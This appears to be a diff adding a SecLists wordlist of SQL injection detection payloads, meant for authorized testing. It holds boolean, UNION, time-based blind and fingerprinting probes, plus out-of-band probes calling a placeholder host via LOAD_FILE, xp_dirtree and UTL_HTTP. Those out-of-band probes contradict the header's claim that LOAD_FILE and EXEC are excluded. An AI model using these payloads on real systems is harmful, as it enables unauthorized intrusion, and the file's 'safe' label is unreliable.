@@ -1,0 +1,187 @@
+# Safe SQL Injection Detection Payloads
+# Purpose: Detect SQLi vulnerabilities WITHOUT causing data modification, deletion, or service disruption.
+# Use case: Authorized penetration tests, WAF testing, bug bounty (where destructive SQLi is disallowed)
+#
+# EXCLUDED (dangerous):
+#   - OR 1=1 / AND 1=2  (logical operators that bypass auth or alter result sets unexpectedly)
+#   - DROP, DELETE, UPDATE, INSERT, TRUNCATE  (DML/DDL)
+#   - SLEEP(N), pg_sleep(N), WAITFOR DELAY  (except labeled time-based section)
+#   - LOAD_FILE, INTO OUTFILE  (file I/O)
+#   - xp_cmdshell, EXEC  (command execution)
+#
+# Author: André Henrique (@mrhenrike) — contributed to SecLists via issue #1011
+# License: MIT
+# -----------------------------------------------------------------------------
+
+# ── SYNTAX / ERROR-BASED DETECTION (single character probes) ──────────────────
+'
+''
+`
+"
+""
+\
+;
+%27
+%22
+%5C
+%27%27
+%2527
+
+# ── COMMENT SEQUENCES ─────────────────────────────────────────────────────────
+--
+-- -
+-- -+
+--+
+#
+/*
+*/
+/*!
+--+-
+--%20
+#%0a
+%23%0a
+
+# ── ARITHMETIC / TAUTOLOGY SAFE PROBES (no OR/AND bypass) ────────────────────
+'+'
+'||'
+'||''
+1+1
+1-1
+2-1
+1*1
+0+1
+(1)
+((1))
+' '
+'--
+' #
+';--
+
+# ── SINGLE-QUOTE STRING CONTEXT (safe comparison — no bypass) ─────────────────
+'1'='1'
+'1'='2'
+'a'='a'
+'a'='b'
+'foo'='foo'
+x'||'x
+x'||''||'x
+
+# ── DOUBLE-QUOTE STRING CONTEXT ───────────────────────────────────────────────
+"1"="1"
+"a"="a"
+"foo"="foo"
+
+# ── NUMERIC CONTEXT (safe arithmetic probes) ──────────────────────────────────
+1
+1.0
+-1
+0
+2
+1+0
+1-0
+1*1
+1/1
+(1+0)
+(SELECT 1)
+(SELECT 2-1)
+
+# ── ERROR-TRIGGERING (syntax only, no data access) ────────────────────────────
+'(
+'[
+'/*
+'"
+'; '
+';
+'--'
+'#'
+''--
+'''
+''''
+
+# ── STACKED QUERY PROBE (syntax detection, no payload) ────────────────────────
+;
+;;
+; SELECT 1
+; SELECT 1--
+;SELECT 1;--
+; --
+;--+
+
+# ── BOOLEAN CONTEXT SAFE PROBES (no bypass — use diff in response length) ──────
+' AND '1'='1
+' AND '1'='2
+" AND "1"="1
+" AND "1"="2
+1 AND 1=1
+1 AND 1=2
+1 AND (1)=(1)
+1 AND (1)=(2)
+(SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END)
+(SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END)
+
+# ── COLUMN COUNT (ORDER BY — read-only structure detection) ───────────────────
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+ORDER BY 4--
+ORDER BY 5--
+ORDER BY 10--
+ORDER BY 100--
+ORDER BY 1000--
+ORDER BY 1 ASC--
+ORDER BY 1 DESC--
+
+# ── UNION-BASED (NULL only — no data extraction, safe for detection) ──────────
+UNION SELECT NULL--
+UNION SELECT NULL,NULL--
+UNION SELECT NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL,NULL--
+UNION ALL SELECT NULL--
+UNION ALL SELECT NULL,NULL--
+UNION ALL SELECT NULL,NULL,NULL--
+
+# ── TIME-BASED BLIND (labeled — verify authorization before use) ───────────────
+# NOTE: These detect blind SQLi via response delay. Confirm WAF/firewall tolerance.
+# MySQL
+' AND SLEEP(2)--
+1 AND SLEEP(2)--
+'; CALL SLEEP(2)--
+# PostgreSQL
+'; SELECT pg_sleep(2)--
+' AND (SELECT 1 FROM pg_sleep(2))--
+# MSSQL
+'; WAITFOR DELAY '0:0:2'--
+1; WAITFOR DELAY '0:0:2'--
+# Oracle
+' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',2)=1)--
+# SQLite
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000/2))))--
+
+# ── DATABASE FINGERPRINT (read-only version strings) ──────────────────────────
+' AND @@version--
+' AND version()--
+' AND @@global.version_compile_os--
+' AND 1=(SELECT 1)--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+(SELECT @@version)
+(SELECT version())
+(SELECT banner FROM v$version WHERE ROWNUM=1)
+
+# ── ENCODING / BYPASS DETECTION (safe probe variants) ─────────────────────────
+%27
+%2527
+%2527%2527
+%u0027
+0x27
+0x2700
+char(39)
+chr(39)
+CHAR(39)
+CHR(39)
+
+# ── OUT-OF-BAND PROBE (DNS-based, no data — detection only) ───────────────────
+# NOTE: Use your own OOB infrastructure. Replace {yourhost}.
+' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT 1),'.{yourhost}\\a')))--
+'; EXEC master..xp_dirtree '//{yourhost}/a'--
+' UNION SELECT UTL_HTTP.REQUEST('http://{yourhost}') FROM DUAL--
